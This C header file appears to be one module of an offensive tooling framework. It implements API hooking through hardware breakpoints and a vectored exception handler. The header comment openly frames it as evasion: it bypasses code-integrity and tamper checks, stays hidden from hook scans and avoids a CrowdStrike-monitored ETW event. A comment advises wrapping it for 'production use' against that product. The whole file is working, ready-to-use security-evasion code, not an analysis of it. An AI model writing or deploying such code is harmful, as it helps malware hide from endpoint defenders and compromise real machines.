// chunk: evasion/veh_hwbp_hook
// depends: (none)
// provides: hwbp_hook_init, hwbp_hook_add, hwbp_hook_cleanup
// risk: low
// note: VEH-based hardware breakpoint hooking — hook any API without modifying
//       its code. Sets a hardware breakpoint (DR0-DR3) on the target function.
//       When hit, the VEH handler redirects execution to a detour function.
//       Based on LayeredSyscall / Blindside techniques.
//       Advantages over inline hooking: no code patching (bypasses CIG),
//       no memory writes to ntdll/kernelbase (bypasses tamper detection),
//       invisible to hook-detection scans.
//       Uses NtContinue to set debug registers (avoids SetThreadContext
//       ETW-TI event that CrowdStrike monitors).

#ifndef CHUNK_VEH_HWBP_HOOK
#define CHUNK_VEH_HWBP_HOOK

#include <windows.h>

typedef NTSTATUS (NTAPI *pNtContinue)(PCONTEXT, BOOLEAN);

#define MAX_HWBP_HOOKS 4   /* x64 has 4 debug registers: DR0-DR3 */

typedef struct _HWBP_HOOK {
    PVOID target;           /* address to break on */
    PVOID detour;           /* replacement function */
    PVOID original;         /* trampoline (just target+2 to skip breakpoint) */
    int dr_index;           /* which DR register (0-3) */
    BOOL active;
} HWBP_HOOK;

static HWBP_HOOK _hooks[MAX_HWBP_HOOKS] = {0};
static PVOID _veh_handle = NULL;
static pNtContinue _NtContinue = NULL;

static LONG CALLBACK _hwbp_veh_handler(EXCEPTION_POINTERS *ex) {
    if (ex->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    PVOID fault_addr = ex->ExceptionRecord->ExceptionAddress;

    for (int i = 0; i < MAX_HWBP_HOOKS; i++) {
        if (_hooks[i].active && _hooks[i].target == fault_addr) {
            /* Redirect execution to our detour */
            ex->ContextRecord->Rip = (DWORD64)_hooks[i].detour;

            /* Re-enable the breakpoint (single-step clears DR flags) */
            ex->ContextRecord->Dr6 = 0;
            ex->ContextRecord->EFlags |= 0x10000; /* Resume Flag */

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/* Set debug registers via NtContinue to avoid SetThreadContext ETW event */
static void _set_dr_via_ntcontinue(int dr_index, PVOID addr, BOOL enable) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS | CONTEXT_CONTROL | CONTEXT_INTEGER;
    GetThreadContext(GetCurrentThread(), &ctx);

    /* Set the debug address register */
    switch (dr_index) {
        case 0: ctx.Dr0 = (DWORD64)addr; break;
        case 1: ctx.Dr1 = (DWORD64)addr; break;
        case 2: ctx.Dr2 = (DWORD64)addr; break;
        case 3: ctx.Dr3 = (DWORD64)addr; break;
    }

    /* DR7 control: enable local breakpoint, execution break (00), size 1 byte (00) */
    if (enable) {
        ctx.Dr7 |= (1ULL << (dr_index * 2));       /* Local enable */
        ctx.Dr7 &= ~(3ULL << (16 + dr_index * 4)); /* Condition: 00 = execution */
        ctx.Dr7 &= ~(3ULL << (18 + dr_index * 4)); /* Length: 00 = 1 byte */
    } else {
        ctx.Dr7 &= ~(1ULL << (dr_index * 2));      /* Disable */
    }
    ctx.Dr6 = 0;

    if (_NtContinue) {
        /* NtContinue avoids ETW-TI event from SetThreadContext */
        _NtContinue(&ctx, FALSE);
        /* NtContinue doesn't return — execution continues from ctx.Rip */
    } else {
        /* Fallback: SetThreadContext (generates ETW event but still works) */
        SetThreadContext(GetCurrentThread(), &ctx);
    }
}

static void hwbp_hook_init(void) {
    if (_veh_handle) return;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll)
        _NtContinue = (pNtContinue)GetProcAddress(ntdll, "NtContinue");

    _veh_handle = AddVectoredExceptionHandler(1, _hwbp_veh_handler);
}

/*
 * hwbp_hook_add: Hook a function using hardware breakpoint.
 *
 * target  — function to hook (e.g., GetProcAddress(ntdll, "NtWriteVirtualMemory"))
 * detour  — replacement function with same signature
 *
 * Returns the DR index (0-3) on success, -1 if all slots full.
 * The "original" can be called by jumping to target+2 (skips the breakpoint byte).
 *
 * NOTE: NtContinue-based DR setting doesn't return — it resumes from the
 * stored RIP. For simplicity, this version uses SetThreadContext as fallback.
 * For production use with CrowdStrike, wrap the DR setting in a separate
 * thread + NtContinue.
 */
static int hwbp_hook_add(PVOID target, PVOID detour) {
    if (!_veh_handle) hwbp_hook_init();

    int slot = -1;
    for (int i = 0; i < MAX_HWBP_HOOKS; i++) {
        if (!_hooks[i].active) { slot = i; break; }
    }
    if (slot < 0) return -1;

    _hooks[slot].target = target;
    _hooks[slot].detour = detour;
    _hooks[slot].original = (BYTE *)target + 2;
    _hooks[slot].dr_index = slot;
    _hooks[slot].active = TRUE;

    /* Set the hardware breakpoint via thread context */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    switch (slot) {
        case 0: ctx.Dr0 = (DWORD64)target; break;
        case 1: ctx.Dr1 = (DWORD64)target; break;
        case 2: ctx.Dr2 = (DWORD64)target; break;
        case 3: ctx.Dr3 = (DWORD64)target; break;
    }
    ctx.Dr7 |= (1ULL << (slot * 2));
    ctx.Dr7 &= ~(3ULL << (16 + slot * 4));
    ctx.Dr7 &= ~(3ULL << (18 + slot * 4));
    ctx.Dr6 = 0;

    SetThreadContext(GetCurrentThread(), &ctx);

    return slot;
}

/* Remove a hook by DR index */
static void hwbp_hook_remove(int slot) {
    if (slot < 0 || slot >= MAX_HWBP_HOOKS) return;
    if (!_hooks[slot].active) return;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr7 &= ~(1ULL << (slot * 2));
    switch (slot) {
        case 0: ctx.Dr0 = 0; break;
        case 1: ctx.Dr1 = 0; break;
        case 2: ctx.Dr2 = 0; break;
        case 3: ctx.Dr3 = 0; break;
    }
    ctx.Dr6 = 0;
    SetThreadContext(GetCurrentThread(), &ctx);

    _hooks[slot].active = FALSE;
    _hooks[slot].target = NULL;
    _hooks[slot].detour = NULL;
}

static void hwbp_hook_cleanup(void) {
    for (int i = 0; i < MAX_HWBP_HOOKS; i++)
        hwbp_hook_remove(i);

    if (_veh_handle) {
        RemoveVectoredExceptionHandler(_veh_handle);
        _veh_handle = NULL;
    }
}

#endif
